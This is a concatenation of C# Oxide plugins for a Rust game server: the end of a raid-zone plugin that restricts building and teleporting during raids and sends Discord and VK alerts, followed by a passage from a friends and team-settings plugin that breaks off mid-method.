            if (config.discord.enable && alert.discordcooldown < DateTime.Now)
            {
                if (HaxBot != null) HaxBot.Call("SENDMESSAGE", ID, config.discord.text.Replace("{ip}", connect).Replace("{destroy}", destroy).Replace("{name}", name).Replace("{quad}", quad).Replace("{servername}", config.servername));
                else if (DiscordCore != null) DiscordCore.Call("SendMessageToUser", ID.ToString(), config.discord.text.Replace("{ip}", connect).Replace("{destroy}", destroy).Replace("{name}", name).Replace("{quad}", quad).Replace("{servername}", config.servername));
                alert.discordcooldown = DateTime.Now.AddSeconds(config.discord.cooldown);
            }
            #endregion
            #region ОПОВЕЩЕНИЕ В ВК
            if (config.vk.enable && alert.vkcooldown < DateTime.Now)
            {
                string vkid;
                if (VkPlayers.TryGetValue(ID, out vkid))
                {
                    GetRequest(vkid, config.vk.text.Replace("{ip}", connect).Replace("{name}", name).Replace("{destroy}", destroy).Replace("{quad}", quad).Replace("{servername}", config.servername));
                    alert.vkcooldown = DateTime.Now.AddSeconds(config.vk.cooldown);
                }
            }
            #endregion
        }

        private object CanBuild(Planner plan, Construction prefab)
        {
            BasePlayer player = plan.GetOwnerPlayer();
           // Debug.Log(prefab.fullName + " - " + prefab.prefabID);
            if (player == null || !HasBlock(player.userID) || config.block.whitelist.Contains(prefab.prefabID) || prefab.fullName.Contains("assets/prefabs/building core/")) return null;
            player.ChatMessage(config.block.text);
            return false;
        }

        private void CreateTrigger(Vector3 position, int time)
        {
            ZONE oNE = GETZONE(position);
            if (oNE != null)
            {
                oNE.Refresh(config.blockseconds);
                return;
            }
            GameObject sphere = GameObject.CreatePrimitive(PrimitiveType.Sphere);
            sphere.transform.position = position;
            TriggerBase trigger = sphere.GetComponent<TriggerBase>() ?? sphere.gameObject.AddComponent<TriggerBase>();
            trigger.interestLayers = LayerMask.GetMask("Player (Server)");
            trigger.enabled = true;
            ZONE zONE = sphere.AddComponent<ZONE>();
            zONE.START(config.radius, time);
        }

        #region ВК
        class CODE
        {
            public string id;
            public ulong gameid;
        }

        private static Dictionary<string, CODE> VKCODES = new Dictionary<string, CODE>();

        private void callcommandrn(BasePlayer player, string command, string[] arg)
        {
            if (!config.vk.enable) return;
            bool vkaccess = permission.UserHasPermission(player.UserIDString, permvk);

            if (!vkaccess)
            {
                player.ChatMessage(config.messages[MES.notallow]);
                return;
            }
            if(arg == null || arg.Length == 0)
            {
                string vkid;
                if (!VkPlayers.TryGetValue(player.userID, out vkid))
                {
                    player.ChatMessage(config.messages[MES.rnmain]);
                }
                else
                {
                    player.ChatMessage(config.messages[MES.rnmainadded].Replace("{value}", vkid));
                }
                return;
            }
            string command1 = arg[0].ToLower();
            if (command1 == "add")
            {
                if (arg.Length > 1)
                {
                    ALERT aLERT;
                    if (alerts.TryGetValue(player.userID, out aLERT) && aLERT.vkcodecooldown > DateTime.Now)
                    {
                        player.ChatMessage(config.messages[MES.rnaddcooldown].Replace("{time}", FormatTime(aLERT.vkcodecooldown - DateTime.Now).ToLower()));
                        return;
                    }

                    string vkid = arg[1].ToLower().Replace("vk.com/", "").Replace("https://", "").Replace("http://", "");
                    string num = RANDOMNUM();
                    GetRequest(vkid, config.messages[MES.rnadd].Replace("{num}", num), player, num);
                }
            }else if (command1 == "accept")
            {
                if (arg.Length > 1)
                {
                    CODE cODE;
                    if (VKCODES.TryGetValue(arg[1], out cODE) && cODE.gameid == player.userID)
                    {
                        string vkid;
                        if(VkPlayers.TryGetValue(player.userID, out vkid))
                        {
                            vkid = cODE.id;
                        }
                        else
                        {
                            VkPlayers.Add(player.userID, cODE.id);
                        }
                        VKCODES.Remove(arg[1]);
                        player.ChatMessage(config.messages[MES.rnconfirm]);
                        SaveVK();
                    }
                    else
                    {
                        player.ChatMessage(config.messages[MES.rncancel]);
                    }
                }
                else
                {
                    player.ChatMessage(config.messages[MES.rnnocode]);
                }
            }
            else if (command1 == "delete")
            {
                if (VkPlayers.ContainsKey(player.userID))
                {
                    VkPlayers.Remove(player.userID);
                    player.ChatMessage(config.messages[MES.rndelete]);
                }
                else
                {
                    player.ChatMessage(config.messages[MES.rnnovk]);
                }
            }
        }

        private void GetRequest(string reciverID, string msg, BasePlayer player = null, string num = null) => webrequest.Enqueue("https://api.vk.com/method/messages.send?domain=" + reciverID + "&message=" + msg.Replace("#", "%23") + "&v=5.80&access_token=" + config.vk.api, null, (code2, response2) => ServerMgr.Instance.StartCoroutine(GetCallback(code2, response2, reciverID, player, num)), this);
        
        private IEnumerator GetCallback(int code, string response, string id, BasePlayer player = null, string num = null)
        {
            if (player == null) yield break;
            if (response == null || code != 200)
            {
                ALERT alert;
                if (alerts.TryGetValue(player.userID, out alert)) alert.vkcooldown = DateTime.Now;
                Debug.Log("НЕ ПОЛУЧИЛОСЬ ОТПРАВИТЬ СООБЩЕНИЕ В ВК! => обнулили кд на отправку");
                yield break;
            }
            yield return new WaitForEndOfFrame();
            if (!response.Contains("error"))
            {
                ALERT aLERT;
                if (alerts.TryGetValue(player.userID, out aLERT))
                {
                    aLERT.vkcodecooldown = DateTime.Now.AddMinutes(10);
                }
                else
                {
                    alerts.Add(player.userID, new ALERT {vkcodecooldown = DateTime.Now.AddMinutes(10) });
                }
                if (VKCODES.ContainsKey(num)) VKCODES.Remove(num);
                VKCODES.Add(num, new CODE { gameid = player.userID, id = id });
                player.ChatMessage(config.messages[MES.rnnewvk].Replace("{id}", id));
            }
            else if (response.Contains("PrivateMessage"))
            {
                player.ChatMessage(config.messages[MES.rnprivate].Replace("{id}", id));
            }
            else if(response.Contains("ErrorSend"))
            {
                player.ChatMessage(config.messages[MES.rnerror].Replace("{id}", id));
            }
            else if(response.Contains("BlackList"))
            {
                player.ChatMessage(config.messages[MES.rnblack]);
            }
            else
            {
                player.ChatMessage(config.messages[MES.rnerror2].Replace("{id}", id));
            }
            yield break;
        }
        #endregion
        #endregion

        #region HEADER
        private const string permvk = "raidzone.vk";
        private const string genericPrefab = "assets/prefabs/tools/map/genericradiusmarker.prefab";
        private const string raidPrefab = "assets/prefabs/tools/map/explosionmarker.prefab";
        private static string GUIJSON = "";
        private static string GUITEXT = "";
        private static Color COLOR1;
       
        private static Color COLOR2;
        private Dictionary<ulong, GameObject> IsBlock = new Dictionary<ulong, GameObject>();
        private static List<MapMarkerGenericRadius> mapMarkerGenericRadii = new List<MapMarkerGenericRadius>();
        #endregion

        #region ZONE - КЛАСС
        class ZONE : MonoBehaviour
        {
            private MapMarkerGenericRadius generic;
            private MapMarkerExplosion explosion;
            private SphereCollider sphere;
            private List<Network.Connection> ZONEPLAYERS = new List<Network.Connection>();

            public int seconds;

            void Awake()
            {
                sphere = GetComponent<SphereCollider>();
                if (sphere == null)
                {
                    Destroy(this);
                    Debug.Log("sphere null");
                    return;
                }
                gameObject.layer = (int)Layer.Reserved1;
                gameObject.name = "RaidZone";
                sphere.radius = config.radius;
                sphere.isTrigger = true;
                sphere.enabled = true;
            }

            public void START(float radius, int time)
            {
                if (sphere == null)
                {
                    Destroy(this);
                    Debug.Log("sphere null");
                    return;
                }

                seconds = time;
                InvokeRepeating(nameof(OneSecond), 0f, 1f);

                if (config.marker.enable)
                {
                    if (config.marker.boom)
                    {
                        explosion = (MapMarkerExplosion)GameManager.server.CreateEntity(raidPrefab, sphere.transform.position);
                        explosion.SetDuration(time);
                        explosion.enableSaving = false;
                        explosion.Spawn();
                        explosion.SendNetworkUpdate();
                    }

                    if (config.marker.circle)
                    {
                        generic = (MapMarkerGenericRadius)GameManager.server.CreateEntity(genericPrefab, sphere.transform.position);
                        generic.color1 = COLOR1;
                        generic.color2 = COLOR2;
                        generic.radius = radius / 145f;
                        generic.alpha = config.marker.alfa;
                        generic.enableSaving = false;
                        generic.Spawn();
                        generic.SendUpdate();
                        mapMarkerGenericRadii.Add(generic);
                    }
                }
            }

            public void Refresh(int time)
            {
                seconds = time;
            }

            private void OneSecond()
            {
                if (seconds <= 0)
                {
                    DoDestroy();
                    return;
                }

                string GUI = GUITEXT.Replace("{text}", config.gui.text.Replace("{time}", FormatTime(TimeSpan.FromSeconds(seconds))));
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = ZONEPLAYERS }, null, "DestroyUI", "RAIDTEXT");
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = ZONEPLAYERS }, null, "AddUI", GUI);
                seconds--;
            }

            public void AddPlayer(BasePlayer player)
            {
                if (!player.IsConnected || ZONEPLAYERS.Contains(player.net.connection)) return;

              /*  COMBATBK cOMBATBK;
                if (player.TryGetComponent<COMBATBK>(out cOMBATBK))
                {
                    cOMBATBK.DoDestroy();
                }*/

                GameObject x;
                if (ins.IsBlock.TryGetValue(player.userID, out x))
                {
                    if (!config.blockremove && x != null && x != gameObject)
                    {
                        ZONE zONE = x.GetComponent<ZONE>();
                        zONE.RemovePlayer(player, false);
                    }
                    else
                    {
                        ins.IsBlock.Remove(player.userID);
                    }
                }

                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "AddUI", GUIJSON.Replace("{text}", config.gui.text.Replace("{time}", FormatTime(TimeSpan.FromSeconds(seconds)))));
                ZONEPLAYERS.Add(player.net.connection);
                ins.IsBlock.Add(player.userID, gameObject);
             //   Debug.Log(player.displayName + " добавили");
            }

            public void RemovePlayer(BasePlayer player, bool newzone = true)
            {
                if (!player.IsConnected || !ZONEPLAYERS.Contains(player.net.connection)) return;
                ZONEPLAYERS.Remove(player.net.connection);
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connection = player.net.connection }, null, "DestroyUI", "RAIDFONE");
                if (ins.IsBlock.ContainsKey(player.userID)) ins.IsBlock.Remove(player.userID);
                // Debug.Log(player.displayName + " удалили");
                if(newzone) Invoke(nameof(CHECKNEWZONE), 0.1f);
            }

            private void CHECKNEWZONE(BasePlayer player)
            {
                if (player == null || player.IsDead() || !player.IsConnected) return;
                ZONE zONE = GETZONE(player.transform.position);
                if (zONE == null) return;
                COMBATBK cOMBATBK;
                if (player.TryGetComponent<COMBATBK>(out cOMBATBK))
                {
                    cOMBATBK.DoDestroy();
                }
                zONE.AddPlayer(player);
            }

            public void DoDestroy()
            {
                UnityEngine.GameObject.Destroy(gameObject);
                Destroy(this);
            }

            private void OnDestroy()
            {
                CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = ZONEPLAYERS }, null, "DestroyUI", "RAIDFONE");
                foreach(Network.Connection connection in ZONEPLAYERS)
                {
                    if (ins.IsBlock.ContainsKey(connection.userid)) ins.IsBlock.Remove(connection.userid);
                }
                ZONEPLAYERS.Clear();
                if (config.marker.enable)
                {
                    if(config.marker.circle) RemoveGeneric(generic);
                    if (config.marker.boom && !explosion.IsDestroyed) explosion.Kill();
                }
            }
        }

        private void OnEntityEnter(TriggerBase trigger, BaseEntity entity)
        {
            if (trigger == null || trigger.name != "RaidZone") return;
            BasePlayer player = entity.ToPlayer();
            if (player == null || IsNPC(player)) return;
            ZONE zONE = trigger.GetComponent<ZONE>();
            if (zONE == null) return;
            COMBATBK cOMBATBK;
            if (player.TryGetComponent<COMBATBK>(out cOMBATBK))
            {
                cOMBATBK.DoDestroy();
            }
            zONE.AddPlayer(player);
        }

        private void OnEntityLeave(TriggerBase trigger, BaseEntity entity)
        {
            if (trigger == null || trigger.name != "RaidZone") return;
            BasePlayer player = entity.ToPlayer();
            if (player == null || IsNPC(player)) return;

            ZONE zONE = trigger.GetComponent<ZONE>();
            if (zONE == null) return;

            if (!config.blockremove) 
            {
                zONE.RemovePlayer(player, false);
                NextTick(() =>
                {
                    ADDCOMBATBLOCK(player, zONE.seconds, true);
                });
            }
            else
            {
                zONE.RemovePlayer(player);
            }
        }
        #endregion

        #region ПОРНО
        private bool HasBlock(ulong ID)
        {
            return IsBlock.ContainsKey(ID);
        }

        private bool HasBlockTera(Vector3 position)
        {
            return GETZONE(position) != null ? true : false;
        }

        private string CanTeleport(BasePlayer player)
        {
            if(!config.block.tp) return null;
            if (!HasBlock(player.userID)) return null;
            return config.block.text;
        }

        private string canTeleport(BasePlayer player)
        {
            if (!config.block.tp) return null;
            if (!HasBlock(player.userID)) return null;
            return config.block.text;
        }

        private int? CanBGrade(BasePlayer player, int grade, BuildingBlock block, Planner plan)
        {
            if (!HasBlock(player.userID)) return null;
            player.ChatMessage(config.block.text);
            return 0;
        }

        private string CanTrade(BasePlayer player)
        {
            if (!config.block.trade) return null;
            if (!HasBlock(player.userID)) return null;
            return config.block.text;
        }

        private string canRemove(BasePlayer player)
        {
            if (!HasBlock(player.userID)) return null;
            return config.block.text;
        }

        object canRedeemKit(BasePlayer player)
        {
            if (!config.block.kits) return null;
            if (!HasBlock(player.userID)) return null;
            return config.block.text;
        }

        private bool? CanAffordUpgrade(BasePlayer player, BuildingBlock block, BuildingGrade.Enum grade)
        {
            if (!HasBlock(player.userID)) return null;
            player.ChatMessage(config.block.text);
            return false;
        }

        private object OnStructureUpgrade(BuildingBlock block, BasePlayer player, BuildingGrade.Enum grade)
        {
            if (!HasBlock(player.userID)) return null;
            player.ChatMessage(config.block.text);
            return false;
        }

        private bool? OnStructureRepair(BaseCombatEntity entity, BasePlayer player)
        {
            if (!HasBlock(player.userID)) return null;
            player.ChatMessage(config.block.text);
            return false;
        }

        object OnStructureDemolish(BaseCombatEntity entity, BasePlayer player)
        {   
            if(player == null || !HasBlock(player.userID)) return null;
            player.ChatMessage(config.block.text);
            return null;
        }
        #endregion

        #region ХЕЛПЕРЫ
        private static ZONE GETZONE(Vector3 position)
        {
            List<SphereCollider> sphereColliders = new List<SphereCollider>();
            Vis.Colliders(position, 0.1f, sphereColliders);
            if (sphereColliders.Count > 0)
            {
                foreach (var z in sphereColliders)
                {
                    ZONE oNE = z.gameObject.GetComponent<ZONE>();
                    if (oNE == null) continue;
                    return oNE;
                }
            }
            return null;
        }

        private static void RemoveGeneric(MapMarkerGenericRadius mapMarker)
        {
            if (mapMarkerGenericRadii.Contains(mapMarker)) mapMarkerGenericRadii.Remove(mapMarker);
            if (!mapMarker.IsDestroyed) mapMarker.Kill();
        }

        private string RANDOMNUM() => Random.Range(1000, 99999).ToString();
        #endregion

        #region DISMOUNT
        private void CanDismountEntity(BasePlayer player, BaseMountable entity)
        {
            NextTick(() =>
            {
                if (!player.IsConnected) return;
                ZONE zONE = GETZONE(player.transform.position);
                if (zONE == null) return;
                zONE.AddPlayer(player);
            });
        }
        #endregion

        private void SaveVK()
        {
            if (VkPlayers.Count > 0) Interface.Oxide.DataFileSystem.WriteObject("raidzone_vk", VkPlayers);
        }

        private void Unload()
        {
            SaveVK();
            foreach (var z in mapMarkerGenericRadii.ToList())
            {
                RemoveGeneric(z);
            }

            foreach(ZONE zONE in UnityEngine.Object.FindObjectsOfType<ZONE>().ToList())
            {
                zONE.DoDestroy();
            }

            foreach (COMBATBK zONE in UnityEngine.Object.FindObjectsOfType<COMBATBK>().ToList())
            {
                zONE.DoDestroy();
            }

            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = Network.Net.sv.connections }, null, "DestroyUI", "RAIDFONE");
            combatblock.Clear();
            IsBlock.Clear();
            VKCODES.Clear();
            alerts.Clear();
        }

        private void OnPlayerSleepEnded(BasePlayer player)
        {
            timer.Once(0.1f, () =>
            {
                if (!player.IsConnected) return;
                ZONE zONE = GETZONE(player.transform.position);
                if (zONE == null)
                {
                    if (config.blockremove)
                    {
                        GameObject x;
                        if (IsBlock.TryGetValue(player.userID, out x))
                        {
                            if (x == null) return;
                            ZONE zONE2 = x.GetComponent<ZONE>();
                            zONE2.RemovePlayer(player, false);
                        }
                    }
                    return;
                }
                zONE.AddPlayer(player);
            });
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!player.IsConnected) return;

            if (player.IsReceivingSnapshot)
            {
                timer.Once(1f, () => OnPlayerConnected(player));
            }
            if (config.vk.enable && !string.IsNullOrEmpty(config.vk.message) && permission.UserHasPermission(player.UserIDString, permvk) && !VkPlayers.ContainsKey(player.userID)) player.ChatMessage(config.vk.message);

            if (config.marker.enable) foreach (var z in mapMarkerGenericRadii) z.SendUpdate();

            GameObject gameObject;
            if(disconnected.TryGetValue(player, out gameObject) && gameObject != null)
            {
                ZONE zONE;
                if (!gameObject.TryGetComponent<ZONE>(out zONE)) return;
                zONE.AddPlayer(player);
                disconnected.Remove(player);
            }
        }

        private static bool IsNPC(BasePlayer player)
        {
            if (player is NPCPlayer) return true;
            if (!(player.userID >= 76560000000000000L || player.userID <= 0L)) return true;
            return false;
        }

        #region ВРЕМЯ
        private static string m0 = "МИНУТ";
        private static string m1 = "МИНУТЫ";
        private static string m2 = "МИНУТУ";

        private static string s0 = "СЕКУНД";
        private static string s1 = "СЕКУНДЫ";
        private static string s2 = "СЕКУНДУ";

        private static string FormatTime(TimeSpan time)
        => (time.Minutes == 0 ? string.Empty : FormatMinutes(time.Minutes)) + ((time.Seconds == 0) ? string.Empty : FormatSeconds(time.Seconds));

        private static string FormatMinutes(int minutes) => FormatUnits(minutes, m0, m1, m2);

        private static string FormatSeconds(int seconds) => FormatUnits(seconds, s0, s1, s2);

        private static string FormatUnits(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9 || tmp == 0)
                return $"{units} {form1} ";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2} ";

            return $"{units} {form3} ";
        }
        #endregion
    }
}


// --- End of file: RaidZone.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/Friendsbyfermens.cs ---
// --- Original Local Path: HudRust/Friendsbyfermens.cs ---

﻿using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using ProtoBuf;
using Rust;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using ru = Oxide.Game.Rust;

namespace Oxide.Plugins
{
    [Info("Friendsbyfermens", "fermens", "0.1.42")]
    [Description("Система друзей и FF")]
    class Friendsbyfermens : RustPlugin
    {
        #region Config
        private PluginConfig config;

        protected override void LoadDefaultConfig()
        {
            config = PluginConfig.DefaultConfig();
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
        }
        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        private class PluginConfig
        {
            [JsonProperty("Максимальное количество игроков в команде")]
            public int maxcount;

            [JsonProperty("Префикс")]
            public string prefix;

            [JsonProperty("Максимальное количество символов в теге команды")]
            public int max;

            [JsonProperty("Минимальное количество символов в теге команды")]
            public int min;

            [JsonProperty("Запрещенные названия в теге команде")]
            public string[] blacklist;

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    maxcount = 3,
                    prefix = "<color=#F65050>HUB RUST</color> ",
                    min = 2,
                    max = 4,
                    blacklist = new string[] { "MOD", "MODR", "ADMI", "ADM" },

                };
            }
        }
        #endregion
        [PluginReference] private Plugin OneVSOne, Battles;
        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            if (entity == null || info == null) return;
            if (entity is BasePlayer && info.Initiator is BasePlayer)
            {
                BasePlayer takeDamage = entity.ToPlayer();
                if (takeDamage == null) return;
                BasePlayer initiator = info.InitiatorPlayer;
                if (initiator == null || initiator == takeDamage || takeDamage.currentTeam == 0) return;
                settings one;
                if (takeDamage.currentTeam == initiator.currentTeam && setplayers.TryGetValue(initiator.userID, out one) && one.ff)
                {
                    if (OneVSOne != null && OneVSOne.Call<bool>("IsEventPlayer", takeDamage) || Battles != null && Battles.Call<bool>("IsPlayerOnBattle", takeDamage.userID)) return;
                    clear(info);
                }
            }
        }

        void clear(HitInfo info)
        {
            info.damageTypes = new DamageTypeList();
            info.HitEntity = null;
            info.HitMaterial = 0;
            info.PointStart = Vector3.zero;
        }

        Dictionary<SamSite, BuildingPrivlidge> samsites = new Dictionary<SamSite, BuildingPrivlidge>();
        private object OnSamSiteTarget(SamSite samSite, BaseCombatEntity target)
        {
            if (target is BaseMountable || target is HotAirBalloon)
            {
                List<BasePlayer> players = new List<BasePlayer>();
                Vis.Entities(target.transform.position, 2.5f, players);
                if (players == null || players.Count == 0) return null;
                BuildingPrivlidge buildingPrivlidge;
                if (!samsites.TryGetValue(samSite, out buildingPrivlidge) || buildingPrivlidge.IsDestroyed)
                {
                    buildingPrivlidge = samSite.GetBuildingPrivilege();
                    if (buildingPrivlidge == null) return null;
                    samsites[samSite] = buildingPrivlidge;
                }

                if (players.Any(player => buildingPrivlidge.IsAuthed(player))) return false;
            }

            return null;
        }

        private object OnTurretTarget(AutoTurret turret, BaseCombatEntity entity)
        {
            if (entity == null) return null;
            BasePlayer player = entity.ToPlayer();
            if (player == null) return null;
            if (turret.OwnerID == 0) return null;
            if (player.Team != null)
            {
                if(player.Team.members.Any(x=> turret.authorizedPlayers.Any(z => x == z.userid && setplayers.ContainsKey(x) && setplayers[x].turret)))
                {
                    turret.authorizedPlayers.Add(GetPlayerNameId(player));
                    turret.SendNetworkUpdate();
                    return false;
                }
            }
            return null;
        }

        private static PlayerNameID GetPlayerNameId(BasePlayer player)
        {
            var playerNameId = new PlayerNameID()
            {
                userid = player.userID,
                username = player.displayName
            };
            return playerNameId;
        }

        private object CanUseLockedEntity(BasePlayer player, BaseLock baseLock)
        {
            if (player == null || baseLock == null || baseLock.GetEntity() == null || !baseLock.IsLocked()) return null;
            ulong ownerID = baseLock.GetEntity().OwnerID;
            if (ownerID.Equals(0)) return null;
            if (player.Team != null && player.Team.members.Contains(ownerID) && setplayers.ContainsKey(ownerID) && setplayers[ownerID].codelock)
            {
                Effect.server.Run("assets/prefabs/locks/keypad/effects/lock.code.unlock.prefab", baseLock.transform.position);
                return true;
            }
            return null;
        }

        private void Save()
        {
            Interface.Oxide.DataFileSystem.WriteObject("Friendsbyfermens", setplayers);
        }

        private void Unload()
        {
         /*   teams.Clear();
            foreach (var z in RelationshipManager.Instance.teams)
            {
                PLAYERTEAM pLAYERTEAM;
                if (!teams.TryGetValue(z.Key, out pLAYERTEAM))
                {
                    teams.Add(z.Key, new PLAYERTEAM { members = new List<ulong>() });
                    pLAYERTEAM = teams[z.Key];
                }
                pLAYERTEAM.teamLeader = z.Value.teamLeader;
                pLAYERTEAM.teamName = z.Value.teamName;
                pLAYERTEAM.members.AddRange(z.Value.members);
            }
            if(teams.Count > 0) Interface.Oxide.DataFileSystem.WriteObject("teams", teams);*/
            Save();
        }

        private void initializeset(ulong id)
        {
            if (!setplayers.ContainsKey(id)) setplayers.Add(id, new settings());
        }

        private static Dictionary<ulong, PLAYERTEAM> teams = new Dictionary<ulong, PLAYERTEAM>();

        class PLAYERTEAM
        {
            public string teamName;
            public ulong teamLeader;
            public List<ulong> members;
        }

        private void OnServerInitialized()
        {
          /*  Debug.LogError("Конец халявы, ищи альтернативу!");
            Server.Command("o.unload Friendsbyfermens");
            return;
            */
            if(config.blacklist == null)
            {
                config.blacklist = new string[] { "MOD", "MODR", "ADMI", "ADM" };
                config.max = 4;
                config.min = 2;
                SaveConfig();
            }
            setplayers = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, settings>>("Friendsbyfermens");
            foreach (var z in BasePlayer.activePlayerList) initializeset(z.userID);
            RelationshipManager.maxTeamSize = config.maxcount;
            var com = Interface.Oxide.GetLibrary<ru.Libraries.Command>(null);
            com.AddChatCommand("friend", this, "COMMANDER");
            com.AddChatCommand("team", this, "COMMANDER");
            com.AddConsoleCommand("friend", this, "CmdConsolecommandinvite");
            com.AddConsoleCommand("team", this, "CmdConsolecommandinvite");
            
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!player.IsConnected) return;

            if (player.IsReceivingSnapshot)
            {
                timer.Once(1f, () => OnPlayerConnected(player));
                return;
            }

            initializeset(player.userID);
        }

        Dictionary<ulong, settings> setplayers = new Dictionary<ulong, settings>();
        class settings
        {
            public bool ff = true;
            public bool turret = true;
            public bool codelock = true;
        }

        void CmdConsolecommandinvite(ConsoleSystem.Arg arg)
        {
            var player = arg.Player();
            if (player == null || !arg.HasArgs()) return;
            COMMANDER(player, "friend", arg.Args);
        }

        private void COMMANDER(BasePlayer player, string command, string[] args)
        {
            if (string.IsNullOrEmpty(command)) command = "friend";
            settings settings;
            if (!setplayers.TryGetValue(player.userID, out settings))
            {
                setplayers.Add(player.userID, new settings());
                settings = setplayers[player.userID];
            }
            if (args != null && args.Length > 0)
            {
                if(args.Length == 2)
                {
                    if (args[0] == "invite")
                    {
                        if (player.Team == null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "Создайте сначала команду!");
                            return;
                        }
                        if (!player.Team.teamLeader.Equals(player.userID))
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "Только лидер команды может приглашать в команду!");
                            return;
                        }
                        var listplayers = BasePlayer.activePlayerList.Where(z => z.displayName.Contains(args[1]));
                        int countfiend = listplayers.Count();
                        if (countfiend == 1)
                        {
                            BasePlayer friend = listplayers.FirstOrDefault();
                            if (friend.Team != null)
                            {
                                player.Command("chat.add", 2, 0, config.prefix + $"Игрок <color=#F65050>'{friend.displayName}'</color> уже состоит в другой команде.");
                                return;
                            }
                            player.Team.SendInvite(friend);
                            player.Command("chat.add", 2, 0, config.prefix + $"Игроку <color=#F65050>'{friend.displayName}'</color> отправлено приглашение в команду.");
                        }
                        else if (countfiend.Equals(0))
                        {
                            player.Command("chat.add", 2, 0, config.prefix + $"Игрок <color=#F65050>'{args[1]}'</color> не найден.");
                            return;
                        }
                        else
                        {
                            player.Command("chat.add", 2, 0, config.prefix + $"Найдено несколько игроков: <color=#F65050>{string.Join(" ", listplayers.Select(p => p.displayName).ToArray())}</color>");
                            return;
                        }
                    }
                    else if(args[0] == "name")
                    {
                        if (player.Team == null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "У вас нет команды!");
                            return;
                        }

                        if (player.Team.teamLeader != player.userID)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "Только лидер команды может менять тим <color=#F65050>ТЕГ</color>");
                            return;
                        }

                        if (args[1].Length < config.min || args[1].Length > config.max)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + $"Название должно состоять от 2-х до 4-х символов!\nПример: /{command} name Just");
                            return;
                        }
                        string name = args[1].ToUpper();
                        if (config.blacklist.Contains(name) || RelationshipManager.ServerInstance.teams.Any(x => !string.IsNullOrEmpty(x.Value.teamName) && x.Value.teamName == name))
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "Этот тим <color=#F65050>ТЕГ</color> уже занят!");
                            return;
                        }

                        player.Team.teamName = name;
                        List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                        string text = config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> изменил тим <color=#F65050>ТЕГ</color> на <color=#F65050>{name}</color>";
                        ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                    }
                }
                else if(args.Length == 1)
                {
                    if(args[0] == "create")
                    {
                        if (player.Team != null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "У вас уже есть команда!");
                            return;
                        }
                        player.Command("relationshipmanager.trycreateteam");
                    }
                    else if(args[0] == "ff")
                    {
                        if (player.Team == null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "У вас нет команды!");
                            return;
                        }
                        /*  if (!player.Team.teamLeader.Equals(player.userID))
                          {
                              player.Command("chat.add", 2, 0, config.prefix + "Только лидер команды может менять этот параметр!");
                              return;
                          }*/
                        if (settings.ff)
                        {
                            settings.ff = false;
                            foreach (var z in player.Team.members)
                            {
                                BasePlayer gg = BasePlayer.FindByID(z);
                                if (player == null) continue;
                                gg.Command("chat.add", 2, 0, config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> включил урон по тиммейтам!");
                            }
                        }
                        else
                        {
                            settings.ff = true;
                            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                            string text = config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> выключил урон по тиммейтам.";
                            ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                        }
                    }
                    else if (args[0] == "codelock")
                    {
                        if (player.Team == null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "У вас нет команды!");
                            return;
                        }
                        if (settings.codelock)
                        {
                            settings.codelock = false;
                            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                            string text = config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> запретил пользоваться его замками!";
                            ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                        }
                        else
                        {
                            settings.codelock = true;
                            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                            string text = config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> разрешил пользоваться его замками.";
                            ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                        }
                    }
                    else if (args[0] == "turret")
                    {
                        if (player.Team == null)
                        {
                            player.Command("chat.add", 2, 0, config.prefix + "У вас нет команды!");
                            return;
                        }
                        if (settings.turret)
                        {
                            settings.turret = false;
                            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => player.Team.members.Contains(x.userid)).ToList();
                            string text = config.prefix + $"Игрок <color=#F65050>{player.displayName}</color> отключил автоматическую авторизацию в его турелях!";
                            ConsoleNetwork.SendClientCommand(sendto, "chat.add", 0, player.UserIDString, text);
                        }
                        else
                        {
                            settings.turret = true;
